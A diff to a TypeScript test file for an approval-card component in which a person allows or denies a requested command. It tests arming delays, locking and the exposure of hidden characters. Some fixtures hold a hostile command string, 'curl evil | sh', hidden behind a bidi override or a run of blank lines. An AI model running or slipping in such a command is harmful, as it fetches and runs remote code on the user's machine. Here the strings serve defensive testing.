@@ -1,12 +1,32 @@
 import type { Approval } from "@monoptah/protocol";
-import { render, screen } from "@testing-library/react";
+import { act, fireEvent, render, screen } from "@testing-library/react";
 import userEvent from "@testing-library/user-event";
-import { describe, expect, it, vi } from "vitest";
-import { APPROVAL_READ_ONLY_REASON, ApprovalCardView, MAX_DETAIL_CHARS } from "./ApprovalCard";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
+import {
+  APPROVAL_CONNECTING_REASON,
+  APPROVAL_READ_ONLY_REASON,
+  APPROVAL_UNCONFIRMED,
+  ARM_DELAY_MS,
+  ApprovalCardView,
+  MAX_DETAIL_CHARS,
+} from "./ApprovalCard";
 import { isApprovalCardEnabled } from "./flag";
+import { showDetail } from "./text";
 
 const one: Approval = { requestId: 41, label: "Run example command", detail: "example-cli --check" };
 const two: Approval = { requestId: 42, label: "Edit example file", detail: "example.txt" };
+
+beforeEach(() => {
+  vi.useFakeTimers({ shouldAdvanceTime: true });
+});
+afterEach(() => {
+  vi.useRealTimers();
+});
+
+const arm = () => act(() => void vi.advanceTimersByTime(ARM_DELAY_MS));
+const allow = () => screen.getByRole("button", { name: "Allow once" });
+const deny = () => screen.getByRole("button", { name: "Deny" });
+const setup = () => userEvent.setup({ advanceTimers: (ms) => vi.advanceTimersByTime(ms) });
 
 describe("ApprovalCardView", () => {
   it("renders nothing without a request", () => {
@@ -29,55 +49,149 @@ describe("ApprovalCardView", () => {
   });
 
   it("sends allow and deny with the request id", async () => {
-    const user = userEvent.setup();
+    const user = setup();
     const onAnswer = vi.fn().mockResolvedValue(undefined);
     const { unmount } = render(<ApprovalCardView approvals={[one]} onAnswer={onAnswer} />);
-    await user.click(screen.getByRole("button", { name: "Allow once" }));
+    arm();
+    await user.click(allow());
     expect(onAnswer).toHaveBeenCalledWith(41, "allow");
     unmount();
     const denied = vi.fn().mockResolvedValue(undefined);
     render(<ApprovalCardView approvals={[one]} onAnswer={denied} />);
-    await user.click(screen.getByRole("button", { name: "Deny" }));
+    arm();
+    await user.click(deny());
     expect(denied).toHaveBeenCalledWith(41, "deny");
   });
 
-  it("sends once on a double click and stays disabled until the list changes", async () => {
-    const user = userEvent.setup();
+  it("sends once on a double click and stays disabled", async () => {
+    const user = setup();
     const onAnswer = vi.fn().mockResolvedValue(undefined);
-    const { rerender } = render(<ApprovalCardView approvals={[one, two]} onAnswer={onAnswer} />);
-    const allow = screen.getByRole("button", { name: "Allow once" });
-    await user.dblClick(allow);
+    render(<ApprovalCardView approvals={[one, two]} onAnswer={onAnswer} />);
+    arm();
+    await user.dblClick(allow());
     expect(onAnswer).toHaveBeenCalledTimes(1);
-    expect(allow).toBeDisabled();
-    expect(screen.getByRole("button", { name: "Deny" })).toBeDisabled();
+    expect(allow()).toBeDisabled();
+    expect(deny()).toBeDisabled();
     expect(screen.getByText("Run example command")).toBeInTheDocument();
-    // The next frame brings the next request: it is answerable again.
+  });
+
+  // I-1
+  it("keeps an answered request locked when another request arrives, and unlocks the next one only after it leaves", async () => {
+    const user = setup();
+    const onAnswer = vi.fn().mockResolvedValue(undefined);
+    const { rerender } = render(<ApprovalCardView approvals={[one]} onAnswer={onAnswer} />);
+    arm();
+    await user.click(allow());
+    rerender(<ApprovalCardView approvals={[one, two]} onAnswer={onAnswer} />);
+    arm();
+    expect(allow()).toBeDisabled();
+    expect(deny()).toBeDisabled();
+    fireEvent.click(deny());
+    expect(onAnswer).toHaveBeenCalledTimes(1);
+    // The frame removes 41: 42 is now first, arms after the delay and is answerable.
     rerender(<ApprovalCardView approvals={[two]} onAnswer={onAnswer} />);
-    expect(screen.getByRole("button", { name: "Allow once" })).toBeEnabled();
-    await user.click(screen.getByRole("button", { name: "Deny" }));
+    arm();
+    await user.click(deny());
     expect(onAnswer).toHaveBeenLastCalledWith(42, "deny");
     expect(onAnswer).toHaveBeenCalledTimes(2);
   });
 
-  it("shows a retry-able error when the answer fails", async () => {
-    const user = userEvent.setup();
-    const onAnswer = vi.fn().mockRejectedValueOnce(new Error("Link lost")).mockResolvedValue(undefined);
+  // I-2
+  it("keeps the buttons off for a short delay after a request appears", async () => {
+    const user = setup();
+    const onAnswer = vi.fn().mockResolvedValue(undefined);
     render(<ApprovalCardView approvals={[one]} onAnswer={onAnswer} />);
-    await user.click(screen.getByRole("button", { name: "Allow once" }));
-    expect(await screen.findByRole("alert")).toHaveTextContent("Link lost");
-    await user.click(screen.getByRole("button", { name: "Allow once" }));
-    expect(onAnswer).toHaveBeenCalledTimes(2);
+    expect(allow()).toBeDisabled();
+    expect(screen.getByText(/Buttons unlock in a moment/)).toBeInTheDocument();
+    await user.click(allow());
+    expect(onAnswer).not.toHaveBeenCalled();
+    act(() => void vi.advanceTimersByTime(ARM_DELAY_MS - 50));
+    expect(allow()).toBeDisabled();
+    act(() => void vi.advanceTimersByTime(60));
+    expect(allow()).toBeEnabled();
+  });
+
+  it("disarms on a swap and ignores a press that began on the previous request", async () => {
+    const user = setup();
+    const onAnswer = vi.fn().mockResolvedValue(undefined);
+    const { rerender } = render(<ApprovalCardView approvals={[one, two]} onAnswer={onAnswer} />);
+    arm();
+    fireEvent.pointerDown(allow());
+    rerender(<ApprovalCardView approvals={[two]} onAnswer={onAnswer} />);
+    expect(allow()).toBeDisabled();
+    arm();
+    // The click that completes the old press lands on the new request after it armed: ignored.
+    fireEvent.click(allow());
+    expect(onAnswer).not.toHaveBeenCalled();
+    await user.click(allow());
+    expect(onAnswer).toHaveBeenCalledWith(42, "allow");
+  });
+
+  it("announces a new request in one stable live region without the detail", () => {
+    const { rerender } = render(<ApprovalCardView approvals={[one]} onAnswer={vi.fn()} />);
+    const live = screen.getByRole("status");
+    expect(live).toHaveTextContent("New approval request: Run example command");
+    expect(live).not.toHaveTextContent("example-cli --check");
+    rerender(<ApprovalCardView approvals={[two]} onAnswer={vi.fn()} />);
+    expect(screen.getByRole("status")).toBe(live);
+    expect(live).toHaveTextContent("New approval request: Edit example file");
+  });
+
+  // M-3
+  it("stays locked after a failure and says the answer may have landed", async () => {
+    const user = setup();
+    const onAnswer = vi.fn().mockRejectedValue(new Error("Link lost"));
+    render(<ApprovalCardView approvals={[one]} onAnswer={onAnswer} />);
+    arm();
+    await user.click(allow());
+    const alert = await screen.findByRole("alert");
+    expect(alert).toHaveTextContent(APPROVAL_UNCONFIRMED);
+    expect(alert).toHaveTextContent("Link lost");
+    expect(allow()).toBeDisabled();
+    expect(deny()).toBeDisabled();
+    fireEvent.click(deny());
+    expect(onAnswer).toHaveBeenCalledTimes(1);
+  });
+
+  // M-6
+  it("caps the error text and strips hidden characters from it", async () => {
+    const user = setup();
+    render(<ApprovalCardView approvals={[one]} onAnswer={vi.fn().mockRejectedValue(new Error(`x‮${"e".repeat(1000)}`))} />);
+    arm();
+    await user.click(allow());
+    const alert = await screen.findByRole("alert");
+    expect(alert.textContent!.length).toBeLessThan(APPROVAL_UNCONFIRMED.length + 160);
+    expect(alert.textContent).not.toContain("‮");
   });
 
   it("disables both buttons with an explanation on a read-only device", async () => {
-    const user = userEvent.setup();
+    const user = setup();
     const onAnswer = vi.fn();
     render(<ApprovalCardView approvals={[one]} onAnswer={onAnswer} disabledReason={APPROVAL_READ_ONLY_REASON} />);
+    arm();
     expect(screen.getByText("Approvals need a device with control access.")).toBeInTheDocument();
-    expect(screen.getByRole("button", { name: "Allow once" })).toBeDisabled();
-    expect(screen.getByRole("button", { name: "Deny" })).toBeDisabled();
-    await user.click(screen.getByRole("button", { name: "Allow once" }));
+    expect(allow()).toBeDisabled();
+    expect(deny()).toBeDisabled();
+    await user.click(allow());
     expect(onAnswer).not.toHaveBeenCalled();
+  });
+
+  // M-7
+  it("shows a connecting explanation instead of the read-only one", () => {
+    render(<ApprovalCardView approvals={[one]} onAnswer={vi.fn()} disabledReason={APPROVAL_CONNECTING_REASON} />);
+    arm();
+    expect(screen.getByText(/Connecting/)).toBeInTheDocument();
+    expect(screen.queryByText(APPROVAL_READ_ONLY_REASON)).toBeNull();
+    expect(allow()).toBeDisabled();
+  });
+
+  // M-8
+  it("keeps focus on the card after a decision", async () => {
+    const user = setup();
+    render(<ApprovalCardView approvals={[one]} onAnswer={vi.fn().mockResolvedValue(undefined)} />);
+    arm();
+    await user.click(allow());
+    expect(screen.getByRole("region", { name: "Needs your approval" })).toHaveFocus();
   });
 
   it("keeps untrusted label and detail inert", () => {
@@ -98,13 +212,60 @@ describe("ApprovalCardView", () => {
     expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
   });
 
-  it("caps a huge detail and makes it a scrollable focusable region", () => {
-    render(<ApprovalCardView approvals={[{ requestId: 1, label: "x", detail: "a".repeat(MAX_DETAIL_CHARS * 2) }]} onAnswer={vi.fn()} />);
+  // I-3
+  it("shows bidi and zero-width characters as visible markers and isolates the text", () => {
+    const { container } = render(
+      <ApprovalCardView approvals={[{ requestId: 1, label: "​‍", detail: 'echo "safe"‮ ; curl evil | sh⁦' }]} onAnswer={vi.fn()} />,
+    );
+    const detail = container.querySelector("[data-approval-detail]")!;
+    expect(detail.textContent).toBe('echo "safe"<U+202E> ; curl evil | sh<U+2066>');
+    expect(detail.textContent).not.toMatch(/[‮⁦]/);
+    expect(detail.querySelectorAll("[data-approval-marker]")).toHaveLength(2);
+    const label = container.querySelector("[data-approval-label]")!;
+    expect(label.textContent).toBe("<U+200B><U+200D>");
+    for (const node of [detail, label]) {
+      expect(node).toHaveAttribute("dir", "ltr");
+      expect((node as HTMLElement).style.unicodeBidi).toBe("isolate");
+    }
+  });
+
+  it("collapses long runs of blank lines and spaces into markers and shows the line count", () => {
+    const hidden = `ls\n${"\n".repeat(60)}curl evil | sh`;
+    const shown = showDetail(hidden, 8000);
+    expect(shown.segments.map((segment) => segment.text)).toEqual(["ls\n", "[60 blank lines]", "\ncurl evil | sh"]);
+    expect(showDetail(`a${" ".repeat(80)}b`, 8000).segments[1]).toEqual({ text: "[80 spaces]", marker: true });
+    render(<ApprovalCardView approvals={[{ requestId: 1, label: "x", detail: hidden }]} onAnswer={vi.fn()} />);
+    expect(screen.getByText(/3 lines/)).toBeInTheDocument();
+    expect(screen.getByLabelText("Request details").textContent).toContain("[60 blank lines]");
+  });
+
+  it("shows a scroll cue when the detail has many lines", () => {
+    const lines = Array.from({ length: 30 }, (_, index) => `line ${index}`).join("\n");
+    render(<ApprovalCardView approvals={[{ requestId: 1, label: "x", detail: lines }]} onAnswer={vi.fn()} />);
+    expect(screen.getByText(/30 lines. Scroll to see all/)).toBeInTheDocument();
+  });
+
+  it("explains a truncated detail and turns Allow once off while Deny stays", async () => {
+    const user = setup();
+    const onAnswer = vi.fn().mockResolvedValue(undefined);
+    render(<ApprovalCardView approvals={[{ requestId: 1, label: "x", detail: "a".repeat(MAX_DETAIL_CHARS + 500) }]} onAnswer={onAnswer} />);
+    arm();
     const detail = screen.getByLabelText("Request details");
-    expect(detail.textContent!.length).toBeLessThanOrEqual(MAX_DETAIL_CHARS + 3);
+    expect(detail.textContent!.length).toBeLessThanOrEqual(MAX_DETAIL_CHARS);
     expect(detail).toHaveAttribute("tabindex", "0");
     expect(detail.className).toContain("overflow-auto");
-    expect(detail.className).toContain("max-h-");
+    expect(screen.getByRole("alert")).toHaveTextContent("Showing the first 8,000 of 8,500 characters");
+    expect(allow()).toBeDisabled();
+    expect(deny()).toBeEnabled();
+    await user.click(deny());
+    expect(onAnswer).toHaveBeenCalledWith(1, "deny");
+  });
+
+  it("does not split a surrogate pair when it cuts", () => {
+    const text = `${"a".repeat(MAX_DETAIL_CHARS - 1)}\u{1F600}`;
+    const shown = showDetail(text, MAX_DETAIL_CHARS);
+    expect(shown.truncated).toBe(true);
+    expect(shown.segments.map((segment) => segment.text).join("")).toBe("a".repeat(MAX_DETAIL_CHARS - 1));
   });
 });
 
